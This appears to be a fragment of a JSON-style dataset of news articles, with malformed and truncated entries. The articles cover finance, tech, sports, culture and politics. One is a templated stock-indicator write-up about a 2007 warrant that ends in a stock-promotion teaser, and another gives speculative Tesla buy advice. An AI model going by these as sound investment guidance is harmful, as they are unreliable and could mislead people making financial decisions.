closely at stocks that have been on the rise, and they might not be checking on the underlying fundamental data. They may be hoping to ride the wave higher, but may end up shaking their heads. On the flip side, many investors may hold onto stocks for far too long after they have slipped drastically. Waiting for a bounce that may never come can cause frustration and plenty of second guessing. Successful investors are typically able to locate stocks that are undervalued at a certain price. This may take a lot of practice and dedication, but it may do wonders for the health of the portfolio.",

      "text": "Challenger bank Revolut is launching a new product for its small business customers. \nThe U.K. company announced in a blog post on Thursday (Aug. 15) the launch of its Expense Management tool under its Revolut for Business offering. Businesses and freelancers using the paid version of Revolut\u2019s business services are able to access the expense management tool to manage their spending in real time, with the ability for managers to accept or reject expenses made by members of their team. \nTo launch the solution, Revolut has also announced a partnership with small business cloud accounting company Xero , enabling joint customers to integrate expense data between the two platforms for seamless reconciliation. \nRevolut pointed to the company\u2019s existing offering of commercial and virtual card services as an area of opportunity to expand business spend-related services. Adding expense management is an extension of the company\u2019s existing v-card offerings, allowing users to take pictures of purchase receipts to automatically capture spend data. \n\u201cBy bringing all of the essential parts of expense management together in one place, and giving business owners, managers and accountants the ability to approve or reject expenses easily, we\u2019re continuing to help your business thrive,\u201d Revolut said in its announcement. \nEarlier this year, Revolut announced a shift in its market strategy as it worked to expand its market share and global presence. The company has also struggled with regulatory scrutiny and allegations that its CEO Nikolay Storonsky is a \u201cbully,\u201d which Storonsky denied to the Financial Times in April reports. \nRevolut developed a compliance team with plans to double its size in the year ahead, and also expressed interest in strengthening its relationship with traditional financial institutions. \nThe bank first launched Revolut for Business in July with an eye toward freelancers and SMBs after first focusing on the consumer segment.",

      "title": "Is Macquarie Bank Ltd. \u2013 BOCHK European Warrants May 2007 (1269.HK) Headed For a Near-Term Reversal?",
      "text": "Macquarie Bank Ltd. \u2013 BOCHK European Warrants May 2007 (1269.HK) shares have seen the Money Flow Indicator drop below 30, potentially spelling a near-term reversal if it crosses below the 20 line. The Money Flow Indicator is a unique indicator that combines momentum and volume with an RSI formula. Because of its incorporation of volume, the MFI is better suited to identify potential reversals using both overbought/oversold levels and bullish/bearish divergences. As with all indicators, the MFI should not be used by itself. A pure momentum oscillator, such as RSI, or pattern analysis can be combined with the MFI to increase signal accuracy. \nThe MFI was created by Gene Quong and Avrum Soudack and they believed a reading above 70-80 would signify Overbought territory where a reading below 20-10 would indicate that the conditions were indicative of an Oversold price level. \nLearning to secure profits from trading the stock market can involve a lot of diligent work and focus. The more experienced a trader becomes, they may be find it easier to follow good trading techniques. Having a plan may be one of the most important aspects for trading the equity market. Without a plan, traders may find themselves in a bind when faced with difficult real world decisions. When these decisions have a direct impact on profits and losses, traders need to be able to make sure that they make the best possible moves in order to avoid disaster. \nTurning now to some additional numbers, the Relative Strength Index (RSI) is another highly popular momentum indicator used for technical analysis. The RSI can help display whether the bulls or the bears are currently strongest in the market. The RSI may be used to help spot points of reversals more accurately. The RSI was developed by J. Welles Wilder. As a general rule, an RSI reading over 70 would signal overbought conditions. A reading under 30 would indicate oversold conditions. As always, the values may need to be adjusted based on the specific stock and market. RSI can also be a valuable tool for trying to spot larger market turns. Macquarie Bank Ltd. \u2013 BOCHK European Warrants May 2007 (1269.HK) has a 14-day RSI of 46.56, the 7-day is at 34.89, and the 3-day is resting at 7.24. \nMacquarie Bank Ltd. \u2013 BOCHK European Warrants May 2007 (1269.HK) currently has a 14-day Commodity Channel Index (CCI) of -159.51. Active investors may choose to use this technical indicator as a stock evaluation tool. Used as a coincident indicator, the CCI reading above +100 would reflect strong price action which may signal an uptrend. On the flip side, a reading below -100 may signal a downtrend reflecting weak price action. Using the CCI as a leading indicator, technical analysts may use a +100 reading as an overbought signal and a -100 reading as an oversold indicator, suggesting a trend reversal. \nShares of Macquarie Bank Ltd. \u2013 BOCHK European Warrants May 2007 (1269.HK) have a 200-day moving average of 3.96. The 50-day is 3.68, and the 7-day is sitting at 3.82. Using a bigger time frame to assess the moving average such as the 200-day, may help block out the noise and chaos that is often caused by daily price fluctuations. In some cases, MA\u2019s may be used as strong reference points for spotting support and resistance levels. \nThe Average Directional Index or ADX is technical analysis indicator used to describe if a market is trending or not trending. The ADX alone measures trend strength but not direction. Using the ADX with the Plus Directional Indicator (+DI) and Minus Directional Indicator (-DI) may help determine the direction of the trend as well as the overall momentum. Many traders will use the ADX alongside other indicators in order to help spot proper trading entry/exit points. Currently, the 14-day ADX for Macquarie Bank Ltd. \u2013 BOCHK European Warrants May 2007 (1269.HK) is 17.52. Generally speaking, an ADX value from 0-25 would indicate an absent or weak trend. A value of 25-50 would indicate a strong trend. A value of 50-75 would signal a very strong trend, and a value of 75-100 would indicate an extremely strong trend. The Williams Percent Range or Williams %R is another technical indicator that may be useful for traders and investors. \nThe Williams %R is designed to provide a general sense of when the equity might have reached an extreme and be primed for a reversal. As a general observance, the more overbought or oversold the reading displays, the more likely a reversal may take place. The 14 day Williams %R for Macquarie Bank Ltd. \u2013 BOCHK European Warrants May 2007 (1269.HK) is noted at -94.12. Many consider the equity oversold if the reading is below -80 and overbought if the indicator is between 0 and -20. \nInvestors may already be plotting the course for the next few quarters. Many investing decisions may need to be made after the next round of company earnings reports are released. Studying the numbers can help the investor see whether or not the stock\u2019s prospects look good in the near term as well as the longer term. It remains to be seen whether optimism in the stock market will continue into the next year. Investors will closely be monitoring the major economic data reports over the next couple of months. While nobody can be sure which way the momentum will shift, preparing for multiple market scenarios may greatly help the investor if changes start to occur. \nJust-released report names Cannabis Stock of the Year for 2019!

      "title": "Moment launches a new circular polarizer and neutral density filters, 20% off 3-day sale",
      "text": "Moment continues to build out the selection of accessories designed for smartphone photographers and videographers. Last year brought the launch of a special filter mount designed to adapt 62mm filters, but it only fit on top of Moment's lenses. But for those times when you want the original perspective provided by your smartphone camera, or maybe you don't want to travel with a huge filter on the front of your phone, Moment is now launching a new mount and a line of smaller 37mm filters that attach directly to their Photo Cases. \n[embedded content] \nThere are two new types of filters in the family. The first is a circular polarizer (CPL) filter that can be used to cut out glare from certain types of reflective surfaces. In practice, it amps up the blues in the sky and greens in plans. It can also help to cut reflections from windows and many other reflective surfaces. If you're curious about the science and examples, check out the Wikipedia post on polarizing filters . \nThe other new addition to Moment's lineup is a series of neutral density (ND) filters in powers of 4, 8, 16, 32, and 64. These are used to reduce the amount of light coming into the camera and often compared to sunglasses for your camera. This might sound counterintuitive to some, but it's a very important tool for certain types of photography and making better videos. If there's too much light hitting the sensor, your smartphone will either overexpose your video or use a very fast shutter speed, and that produces choppy videos. This is demonstrated in the video above, and you may have noticed it yourself while taking videos during bright days or out in the snow. \nAll of the filters are made from shatterproof B270 grade high-transmission glass. They're antistatic so floating dust won't latch on too easily, and there is a scratch-resistant and hydrophobic coating that will keep mist out of your shots and hopefully prevent accidental damage. The filter frames and the Photo Case mount are made from aerospace grade stainless steel and the NDs are threaded on both sides to support stacking with each other and any other 37mm threaded lenses or filters \u2014 just mind the vignetting if you stack too much. \nCheck out Moment's blog post and the product pages for additional tech specs. \nThe CPL sells for $44.99 while the ND filters are running for $34.99 each. Don't forget, you'll also need a filter mount to attach these to a Moment Photo Case. The mount runs an extra $9.99, but you can pick it up a combo with a filter and get $5 off. And if you don't have a case yet, the most efficient option will be to pick up a bundle with a Photo Case, mount, CPL, and one of the ND filters for $30 off the normal price. Everything is available at shopmoment.com starting today. There's also a sale going for early bird shoppers that will get an extra 20% off until Friday with the code #goodlight .",

      "title": "Easter creates tons of plastic trash\u2013here\u2019s how to celebrate sustainably",
      "text": "With Easter around the corner, strolling around your neighborhood means stepping into a cheery world of pastels, egg motifs, and bunny rabbits. The majority of Americans celebrate Easter, and for many the highlight of the day is an epic Easter egg hunt. According to the National Retail Federation, a third of all celebrants are planning a hunt, and among younger consumers\u2013those between the ages of 18 and 34\u2013nearly half are planning a hunt. \nIt\u2019s all very joyous, but if you\u2019ve been on a mission to be more environmentally responsible, you may be wondering about the impact of the holiday on the planet. The bottom line is that Easter\u2013like other holidays\u2013generates a lot of waste. According to the National Retail Federation , 85% of Americans plan to celebrate the holiday, and this will result in more than $18 billion in spending. A full $2.4 billion will go into buying candy and chocolate, which is actually more money than Americans spend on Halloween. Many of these sweets will be prizes in an Easter egg hunt. \nThis means a lot of plastic eggs. It\u2019s hard to get an accurate count on the number of plastic eggs sold every year, but all evidence suggests it\u2019s a very high number. Bleyer Industries was once the only American manufacturer of plastic eggs, and at its height in the early 2000s, it was making 250 million eggs a year. It has since gone bankrupt because it could not compete with the cheaper plastic eggs coming out of China. And given that Easter spending has increased every year for the last few decades, it is likely that even more plastic eggs are currently being sold. \nThe vast majority of these cheap plastic eggs are disposable. Half of all Americans will stuff eggs with cheap plastic toys, adding to the waste. And then there\u2019s all the fake plastic grass that we use to stuff our baskets and eggs with. That\u2019s a whole lot of plastic in your trash can at the end of the day. None of this means you need to skip the merriment of Easter altogether. Here are some tips for creating a fun holiday for the family that also respects the Earth. \nOpt for Eco-Friendly Eggs \nIf you\u2019re doing an indoor Easter egg hunt, opt for using paper eggs, which are biodegradable, or wooden eggs , which cost more but are reusable. These eggs generally aren\u2019t durable enough to survive the elements outdoors. But on the upside, you can have fun painting them with your family before the big day. \nIf you\u2019re planning on doing an outdoor hunt and feel like you need to use plastic, opt for reusable eggs made from recycled plastic from Eco Eggs . They\u2019re sold online at Bed, Bath and Beyond, and at retailers like Whole Food. They come in multiple sizes, and are generally more expensive than less eco-friendly version. But they\u2019re not totally unaffordable: A bag of 24 eggs costs $9.99. The key is to collect the eggs at the end of the day and save them for next year\u2013and tell your guests that the eggs are reusable as well. \nGet A Basket For The Ages \nEvery year, drugstores and retailers like Target tempt us with attractive, inexpensive baskets for our egg hunts. It\u2019s easy to buy a new one each Easter. But instead, it makes sense to get a more durable basket. If you\u2019re buying it for your child, the trick is to get something that is colorful and fun, but still somewhat classic. This means skipping the Paw Patrol or Mickey Mouse baskets. Instead, you could go with a sturdy willow basket, perhaps even embroidered with your child\u2019s name on it. ( Amazon sells them for $35.) Alternatively, you could get a simple basket with a replaceable liner, so you can swap out the pattern in a few years when your child grows out of, say, unicorns. ( Pottery Barn sells a range of them starting at $14.50.) \nGet Creative With Your Stuffers \nInstead of the usual plastic toys, here are some alternative ideas for things to put inside the eggs that will last longer. \nPuzzle Pieces : If you have a small party, with children that are similar in age, you can put puzzle pieces inside the eggs, then have the kids try to put the puzzle together afterwards. \nDuplo or Lego Pieces: If your kids aren\u2019t into puzzles, you can get a small Duplo or Lego set, and include the pieces inside the eggs. \nMagnets: It\u2019s fairly easy to get a set of alphabet, number, or animal magnets. \nMarbles: If there are no infants in the groups, you can kick-start a marble collection by including them in the eggs. \nRace Cars: Hot Wheels will fit inside a slightly larger egg. \nLip Balms and Hair Ties: For slightly older children, these are fun things that are also practical. \nSeeds: My favorite idea is to include a small packet of seeds inside the eggs. Then spend the rest of the day planting them in the soil with your children. It\u2019s a fun activity that can also serve as a teaching moment, helping them understand plants grow and the seasons change. \nMake Egg-Decorating The Main Activity \nThe egg hunt is always a highly anticipated activity, but there are other Easter traditions that are just as fun and less wasteful. One is egg decorating. \nYou can use hard boiled eggs, but these won\u2019t last that long, since eventually you\u2019ll have to eat the eggs, which will mean cracking the shell. If you\u2019re more adventurous, you can create a small hole at the top of an egg, and a larger hole at the bottom, then blow out the center of the egg into a bowl. You can then use this raw egg for an omelette. Once you wash out the empty shell, you can decorate it and keep it for years. \nThere are plenty of nontoxic dyes, including this $9.99 kit created by Eco-Kids which are made from organic fruit and vegetable extracts. But if you want to be a bit more adventurous, you can make your own natural dyes. The Incredible Egg , an egg enthusiast site created by the American Egg Board, has useful information about how to create dyes from highly pigmented foods you already have in your kitchen like beets, spinach leaves, and turmeric.",

      "title": "Still Outlawed By England And UEFA, Safe Standing Gains Foothold In MLS",
      "text": "With plans to grow to 32 teams, an end-of-season playoff system and the absence of promotion and relegation, some would accuse Major League Soccer of over-Americanizing the world\u2019s game. \nYet there\u2019s one MLS trend gaining steam that is surprisingly traditionalist and may even give fans a window into what it was like to watch matches across Europe for the majority of the 20th century. \nWhile standing-room terraces remain but a memory of a simpler time in high-level English and UEFA competitions, modified safe-standing terrace sections are becoming increasingly popular at MLS grounds. \n(For more on what differentiates safe-standing terraces from others, watch below.) \nEarlier this week, the New York Red Bulls announced they would be retrofitting the south end of Red Bull Arena with safe-standing sections to house the majority of their most vocal supporers groups. The LA Galaxy recently unveiled the name of their offseason safe-standing renovation at Dignity Health Sports Park. \nAdditionally, new stadiums for LAFC, the San Jose Earthquakes, Minnesota United and Orlando City were opened with safe standing already included. Yet-to-be completed projects in Austin, Columbus and Cincinnati are set to join them. And like the Red Bulls and Galaxy, D.C. United is also looking into retrofitting safe standing into Audi Field, which opened in 2018. \nIf all those plans come to fruitition, that would mean 10 of 30 active or expansion teams in MLS have stafe-standing facilities. And in the United States and Canada \u2014 where the focus in pro sports is often on spectator comfort and where soccer still occasionally battles the hooliganism trope\u2014 that\u2019s somewhat remarkable. \nTo be clear, none of the current or future facilites will look anything like the old-fashioned English grounds, in which often two-thirds of capacity was standing and one-third was seated. \u201cThe Wall\u201d at Orlando\u2019s Exploria Stadium is currently the league\u2019s largest safe-standing section, able to accomodate just over 3,800 supporters in a facility that holds 25,000 total. \nAnd MLS is helped by the lack of institutional memory of any tragedies involving terraces. The average American or Canadian fan age 18-34 would have very little or no recollection of the disasters at Heysel Stadium and at Hillsbrough in the 1980s. If their parents were in the Western hemisphere, news of those catastrophes may not have registered in any specific way. \nPerhaps, however, those same young MLS fans have made trips to Germany \u2014 where terraces remain plentiful at domestic games \u2014 to watch countrymen like Alphonso Davies, Christian Pulisic, Tyler Adams and Weston McKennie in the Bundesliga. \nThis much seems clear: the trend doesn\u2019t show any sign of slowing. Where safe standing has been unveiled, it has been almost universally popular. And with most teams now as the primary tennants in their stadiums, there is little to halt other interested clubs from following suit in a trend that began at San Jose\u2019s Avaya Stadium in 2015. (The exceptions would be Seattle, Atlanta, Charlotte, Vancouver and New York City FC, who all share their stadiums with NFL, CFL or MLB teams.) \nThere is plenty to dislike about MLS\u2019 attempts to manufacture authenticity, be it with the league\u2019s contrived rivalry week promotions or clubs clumsily including European prefixes or suffixes in their names (Sporting, Real, FC, United, etc.) \nOn safe standing, though, MLS clubs should be commended for taking action to allow the passion of the game to be displayed in its purest form.

      "text": "In what can only be described as a win for open standards, the Wikimedia Foundation \u2014 the San Francisco-based nonprofit that hosts Wikipedia and related community projects \u2014 today announced that it\u2019s joining the World Wide Web Consortium (W3C), the leading international standards organization for the World Wide Web. In a blog post published this morning, senior software engineer Gilles Dubuc says its work with W3C will principally entail providing feedback, attending meetings with other members, participating in standards\u2019 designs, and performing \u201csome of the technical work necessary to put [them] together.\u201d \n\u201cWe are pleased to welcome the Wikimedia Foundation among our membership,\u201d said W3C global business development leader Alan Bird. \u201cWith their 2030 strategy and interests in so many of the areas we advance on the web, we anticipate that the Wikimedia Foundation\u2019s participation will be key in building the services and structures that enable web users.\u201d \nThe move, Dubuc points out, aligns with the 2030 strategy Wikimedia outlined last October, which calls on the online encyclopedia to \u201cbecome the essential infrastructure of the ecosystem of free knowledge.\u201d Web technologies and standards are necessarily a part of this \u2014 the W3C, which was founded in 1994 by tech luminary Tim Berners-Lee, comprises over 476 organizations working together to ensure web technologies remain consistent across browsers and platforms. And these agreed-open, vendor-agnostic standards facilitate \u201cknowledge equity,\u201d Dubuc says. \n\u201cTo achieve our vision, we need to participate and collaborate in designing the future of the web,\u201d he added. \u201cWe\u2019re going to contribute to shaping a future of the web that helps everyone create and share free knowledge.\u201d \nToday\u2019s announcement comes after Facebook pledged over $1 million to the Wikimedia Endowment, the fund that financially supports Wikipedia and other Wikimedia projects, following in the footsteps of tech giants like Amazon, Apple, Qualcomm, Salesforce, Adobe, Google, and Netflix. \nWikipedia, which was visited over 190 billion times last year, currently offers its database of articles in about 300 languages. Through an expanded partnership with Google announced in January, it plans to grow that number by 15 languages (pushing the overall count to 121) in the coming months by integrating Google Translate into its content translation tool .",

      "text": "Slashleaks \nAn upcoming phone by Chinese phonemaker Oppo supposedly has a unique take on the pop-up selfie camera that's designed to hide the selfie camera when it's not in use. \nThe camera pop-up is wedge-shaped, which looks less fragile than other popup selfie cameras. \nHiding the selfie camera when it's not in use is the best way we've seen so far to keep a full-screen display without interruptions from an iPhone X-style notch or Samsung Galaxy S10-style camera cutout. \nPhotos of a smartphone called \"Reno\" from Chinese smartphone maker Oppo were leaked on Slashleaks , and it goes to show how smartphone makers are still innovating to give users a full-screen display and a selfie camera. \nIndeed, there's no way to fully hide a selfie camera behind a screen, which has led companies like Apple, Samsung, and another dozen or so phonemakers to use a notch or display cutouts that let the selfie camera take photos. \nThe Oppo Reno has a unique wedge-shaped pop-up selfie camera: \nSlashleaks \nFunnily enough, the wedge pop-up itself actually has a design element that looks like a notch, which you can see just to the top left of the selfie camera's flashlight. \nAt first, I thought it might work with a manual push mechanism to pop out or hide the selfie camera back into the Reno's body, but a recently leaked video on Slashleaks's YouTube channel of the Reno suggests it uses a mechanical mechanism: \nIt's an interesting idea, but I'd like to propose the ultimate challenge to smartphone makers: make a phone without a selfie camera at all for those who decidedly never take selfies. That way, those people can have their full-screen displays without notches, cutouts, or pop-up selfie cameras. But in the age of social media, that challenge might be too great for any smartphone maker to undertake. ",

      "title": "Canada Has Made Pot Super Boring",
      "text": "This 4/20 will be different, at least in Canada. It will be the first celebration of marijuana since the country made pot legal in October, 2018. The time passed since the end of prohibition hasn\u2019t been long enough to establish any direct consequences from legalization so far, but one thing has already become painfully clear from Canada\u2019s experiment. When you make pot legal, you make it super, super boring. \n\u201cWorthwhile Canadian Initiative,\u201d a 1986 article in the New York Times , famously inspired a contest, held by The New Republic , to find the world\u2019s most boring headline. Marijuana is now a worthwhile Canadian initiative, and the Canadian government has done its best to live up to its dull reputation. In the immediate aftermath of legalization, most government weed was only available by mail. This was not a problem, until there was a postage strike. Then, when the government weed did arrive, the containers, with their elaborate warning labels and massive quantities of plastic packaging, resembled, more than anything, home enema kits. \nOther than new signs at the airport warning the more dull-witted Canadian citizens to dispense of their marijuana in the appropriate receptacles before leaving the country, it was hard to notice any real change after the passage of the marijuana laws. The pot dispensaries, semi-underground before the end of prohibition, were supposed to disappear, but went on just as before. They\u2019ve just becoming increasingly polished. The place where I buy my weed looks like a Pottery Barn, and it was so busy the other day that they gave me one of those buzzers they hand out at Shake Shack to tell you when your order is ready. I had to wait twenty minutes. \nIt\u2019s also money that\u2019s making pot boring. Recently, I went to a champagne-and-hot-wings party\u2014a superb concept, by the way\u2014in a wealthy neighborhood in Toronto, and it felt like half the people attending were in the cannabis industry in one way or another; many of them had transitioned from hedge funds. Marijuana stocks have overtaken real estate as the standard conversational go-to of Toronto dinner parties. And you have not understood how banal marijuana can be until you overhear two parents watching their kids at a swimming lesson discuss how I.S.O. 9000 certification affects the marketing efforts for stocks of C.B.D.-extract companies. \n\u201cSeth Rogen and Evan Goldberg are turning their lifelong passion into superior elevated products with the launch of Houseplant ,\u201d an e-mail informed me last month. \u201cAfter five years of diligent hands-on work, Seth and Evan are proud to be delivering the highest quality cannabis products to Canadians in partnership with Canopy Growth Corporation.\u201d \u201cSuperbad\u201d is about to have its own brand of weed! And they\u2019re proud of being attached to a corporation. It sullies the whole experience, never mind the movie. \nEven a few months after legalization, I find myself wondering how much of the pleasure of marijuana came from its illicitness. When you used to pass around a joint, you were sharing a little naughtiness, a tiny collective experience of rebellion. Now, at a party, when you a pass around a joint, you\u2019re basically saying let\u2019s go stare at things for a while. When I see cops on the street today, there is nothing I do that might upset them. We are on the same side, utterly. It\u2019s pathetic. \nThere may still be dangers to marijuana, of course. The public-health effects of legalization are, as yet, unknown. Nobody knows whether legalization will lead to higher rates of teen-age mental illness, or to traffic accidents. But, already, it is unimaginable that marijuana would be made illegal again. Even with the brief distance of a few months since the end of prohibition, the sheer stupidity of the drug war appears absolute. Marijuana isn\u2019t worth the attention of the police. It\u2019s not even that good a drug. It wouldn\u2019t be in my top five, anyway. \nOne of the most important consequences of marijuana\u2019s legalization is that the drug can now be studied. We might learn how it works and what it does to people. Clinical trials will replace the loose collection of vague anxieties and promotional pseudoscience that have dominated discussions of marijuana up to this point in history. It will finally be possible to think sensibly about marijuana. And what could be more boring? \nIt has to be said, in boredom\u2019s defense, that it\u2019s the cure for a great number of evils. The clich\u00e9 holds that America is losing the war on drugs, but it\u2019s not quite accurate. Cocaine and heroin have never been cheaper. Overdose deaths recently topped car accidents as a more likely cause of death for adults in the United States. But America is very much winning the war on drugs that are legal: tobacco use has declined sixty-seven per cent since 1965, and drunk-driving fatalities by forty-eight per cent since 1991. Of course, the way America reduced the use of these drugs wasn\u2019t by killing bad guys and arresting users en masse, but by treating them like social problems with collective solutions. Yawn. No one\u2019s going to make a season of \u201cNarcos\u201d out of that. \nCanada is proving, once again, the deep political power of boredom: if you want to suck the power and glamour out of drugs, let the government run them.",

      "text": "Data-to-text generation can be conceptually divided into two parts: ordering and structuring the information (planning), and generating fluent language describing the information (realization). Modern neural generation systems conflate these two steps into a single end-to-end differentiable system. We propose to split the generation process into a symbolic text-planning stage that is faithful to the input, followed by a neural generation stage that focuses only on realization. For training a plan-to-text generator, we present a method for matching reference texts to their corresponding text plans. For inference time, we describe a method for selecting high-quality text plans for new inputs. We implement and evaluate our approach on the WebNLG benchmark. Our results demonstrate that decoupling text planning from neural realization indeed improves the system's reliability and adequacy while maintaining fluent output. We observe improvements both in BLEU scores and in manual evaluations. Another benefit of our approach is the ability to output diverse realizations of the same input, paving the way to explicit control over the generated text structure.",

Craig\u2019s indictment was also somewhat less of a surprise after his attorneys pre-emptively put out a statement in his defense the night before, foreshadowing the indictment. \nThursday\u2019s indictments were one more signal that although special counsel Robert Mueller\u2019s investigation has wrapped up, fallout from the inquiry is certain to continue. One of the lasting effects of the Russia probe will almost certainly be increased enforcement and scrutiny of those lobbying for foreign governments. \nTrump's allies embraced Craig's indictment on Thursday. In one tweet, former Trump campaign manager and senior counselor to the president Kellyanne Conway hailed the \"breaking news,\" writing that \"FINALLY! WHITE HOUSE OFFICIAL INDICTED in connection with MUELLER investigation!\" \nBut while the president on Friday labeled the charges against Craig \u201cvery serious,\u201d he didn't mention the parallels between the cases or Craig's ties to his own former advisers who he contends were treated unfairly by the Justice Department. \nThe charges announced Thursday stem from work Craig did in 2012 \u2014 after leaving the White House \u2014 on a report relating to Ukrainian President Viktor Yanukovych\u2019s jailing of one of his political opponents: former Prime Minister Yulia Tymoshenko. That report was meant to be used by Paul Manafort, the president\u2019s former campaign chairman, who had been lobbying for Yanukovych at the time, to defend the former president. \nWhile Craig has maintained his innocence, prosecutors accused him of purposefully and repeatedly misleading federal investigators about whether he needed to register as a foreign lobbyist, including when he sat for an interview with Mueller. \nManafort pleaded guilty last year for failing to register as a foreign agent, among other things, and earlier this year was sentenced to more than seven years in prison. Trump said at the time that Manafort\u2019s sentencing was a \u201cvery sad situation\u201d and that he felt \u201cbadly\u201d for him. \nAnd Trump\u2019s first national security adviser, Michael Flynn, similarly got swept up in renewed scrutiny of the rarely enforced Foreign Agents Registration Act during the Mueller probe, though he ultimately pleaded guilty only to lying to the FBI about his conversations with the then-Russian ambassador to the U.S. \nTrump has expressed plenty of sympathy for Flynn, reportedly asking then-FBI Director James Comey to ease up on him and reluctantly ousting him after less than a month on the job. Trump has downplayed the accusations against Flynn, wavering between accusing the FBI of trapping his former aide and dismissing the charges as \u201cthe smallest of misstatements.\u201d \nOn the day Flynn was set to be sentenced last year, Trump wished Flynn \u201cgood luck in court,\u201d leading some to warn the president against a possible pardon.",

      "title": "Tesla's Rough Ride In The First Quarter - Tesla, Inc. (NASDAQ:TSLA)",
      "text": "Source: Electrek.com \nTesla\u2019s Rough Ride In Q1 \nTesla ( TSLA ) has had a rough ride this quarter, and the company\u2019s stock reflects it, as Tesla\u2019s shares are down by nearly 30% from recent highs of $380 reached in late 2018. Recently, the company reported disappointing delivery numbers for Q1. Moreover, Tesla\u2019s EPS and revenues are very likely going to miss consensus estimates (possibly by a wide margin) when the company reports on May 1 , 2019 . \nAdditionally, Tesla\u2019s shares could decline further once the disappointing Q1 numbers are fully disclosed. Nevertheless, I view this as a transitory quarter for the company, the long-term image remains strong, and any further declines into and/or following Q1 earnings should be viewed as a buying opportunity. \nQ1 Production/Deliveries \nTesla produced a total of 77,100 vehicles in Q1 , down 11% QoQ , but a 124% increase YoY . \nModel 3 production came in at 62,950 vehicles, a 2.5% increase QoQ. \nModel S/X production came in at just 14,150 vehicles, a QoQ slide of 44%, and a YoY decline of 43%. \nTesla delivered 63,000 vehicles, a 31% QoQ decline, but a 110% YoY increase. \nThe company delivered 50,900 Model 3s and just 12,100 Model S/X vehicles. \nModel S/X deliveries were down 47% YoY, and down by 56% QoQ. \nTesla Deliveries \nSource: Statista.com \nThe Takeaway \nTesla delivered just 63,000 vehicles, well short (17%) of Wall Street estimates that called for 76,000 vehicles to be delivered in the quarter. Some of the delivery shortfall can be attributed to the 10,600 vehicles Tesla had in transit to customers in Europe and China at the end of the quarter. \nThe vehicles in transit should boost Q2 deliveries nicely. Furthermore, a key factor to consider is that this was the first quarter in which Tesla sent a substantial number of Model 3 vehicles overseas, mainly to Europe and China. Logistics and other factors also can be partly responsible for the weaker than expected numbers. \nAdditionally, there doesn\u2019t appear to be any major issues with Model 3 demand. In fact, it's positive that Tesla is shipping Model 3s to international markets, as it will allow for Model 3 demand to pick back up in the U.S. Also, introduction of Model 3 vehicles around the world should help market the vehicle and spike global demand going forward. \nThere's also clear indication that Model 3 sales bounced back strongly in March. According to InsideEVs\u2019 estimates, Tesla delivered 10,175 Model 3s in March , substantially more than the 5,750 estimate for February, the 6,500 estimate for January, and the 3,820-number delivered in March 2018. \nNow the Bad News \nModel S/X sales seemingly fell off a cliff in Q1, down by 56% QoQ and down by 47% YoY. There are several reasons why this could have happened. The No. 1 reason is likely increased focus on bringing Model 3 to Europe and China. By focusing more resources on bringing Model 3s to new markets, less emphasis was placed on bringing Model S/X vehicles to foreign markets. \nIn fact, there's strong indication that sales in the U.S. were quite robust toward the end of the quarter, as 4,450 Model S/X vehicles were estimated to have been delivered in March in the U.S. alone. That\u2019s approximately 37% of all deliveries in just one month, and in just one market (the U.S.). This further solidifies the theory that Tesla\u2019s strategy was to ship Model 3s to Europe and China rather than Model S/X vehicles. \nThis implies that much of the shortfall in Model S/X sales is not so much demand related as it is a supply issue on Tesla\u2019s part. This is likely a transient issue, and should get resolved throughout this year as Tesla optimizes its logistics to overseas markets. \nNow, some of the sales related to Model S/X vehicles are likely getting cannibalized by the Model 3, but it's likely not as bad as it seems. Furthermore, the Model S and Model X need a refresh, as current models have become slightly stale. The good news is that an interior refresh is scheduled for this year , and performance upgrades also are likely to be made available later in the year for the Model S/X models. \nThe company also reiterated its target for 360,000 \u2013 400,000 deliveries for the full year, reinforcing the idea that Q1 will very likely be the low point for Tesla this year. \nQ1 Estimates \n50,900 Model 3s at $55,000 (est.) ASP equates to $2.8 billion in revenues. \n12,100 Model S/X vehicles at $100,000 (est.) ASP equates to $1.21 billion in revenues. \nHere\u2019s What I Expect Q1 Numbers to Look Like \nSource: Author's Material \nWe can see that revenues are likely to slip by approximately 30% QoQ. Also, it\u2019s important to mention that I used a $55K ASP for Model 3 estimates, and if the ASP comes in lower (closer to $50K), we can expect an even bigger drop. \nI expect gross margins to stay roughly in line with the prior two quarters. Due to much of the Model 3 sales occurring in Europe and in China, we can expect many of these to be premium versions. Therefore, both ASPs and gross margins should look quite healthy (above 20%) in the Model 3 segment. \nHowever, we can expect to see higher operating expenses as SG&A costs likely rose QoQ due to overseas shipments. Thus, we are likely to see a slight operating loss for Q1, a big drop from the 5.8%, and 6.5% operating margins we saw in Q4 and Q3 last year. \nI factored in $100 million in ZEV credit revenues, but even with this amount Tesla will likely fall short of a positive income quarter. Overall, I expect the company to report a loss of about $125 million in Q1, equivalent to an EPS loss of roughly 72 cents. \nWhat the Analysts Are Missing \nUnfortunately, most analysts still appear to be far too bullish on Q1 numbers. Consensus revenue estimates call for Q1 revenues to come in at $5.66 billion , with top end estimates going all the way up to $6.97 billion. \nHowever, my estimates call for revenues of just $5.17 billion, and that's with a $55K ASP for Model 3 vehicles (higher end target). If we apply a slightly lower ASP of $50K, which is my lower end target, we arrive at Q1 revenues of just $4.92 billion, far below consensus estimate figures. \nFurthermore, although EPS estimates have come down dramatically for Q1, consensus figures of minus 34 cents per share still look much too optimistic. Even with $100 million in ZEV credit revenues Tesla will likely report a loss of more than twice what consensus estimates suggest. My model calls for a loss of 72 cents per share, and if the Model 3 ASP comes in lower than the $55K used in the model, the loss could be worse. \nThe Bottom Line \nTesla is set to release Q1 earnings in fewer than three weeks, and based on the company\u2019s deliveries numbers it's going to be a very rough quarter, probably substantially worse than most analysts believe. Both revenues and EPS are likely to come in well below consensus estimates in Q1. \nHowever, market participants should not be alarmed, as the company likely has plenty of cash to absorb the loss ( $3.7 billion at the end of 2018 ). Moreover, the weak quarter does not appear to imply that there are systemic troubles at Tesla. Instead, Q1 likely represents a transitory time for the company as Tesla transforms its Model 3 logistics network to cater to international markets. \nI expect sideways price action into earnings with a possible gap lower once Tesla reports a weaker than expected quarter. However, I would use any significant weakness in the stock as a buying opportunity. Sales of the Model S/X and 3 vehicles are likely to recover throughout the year, and the company\u2019s revenues and EPS are likely to improve going forward, paving the road for a higher stock price post Q1 earnings. \nWant to know more?

      "text": "The National Australia Bank Ltd. (ASX: NAB) share price has been steadily recovering from its December lows of around $22.80 and is currently trading around $25.16.

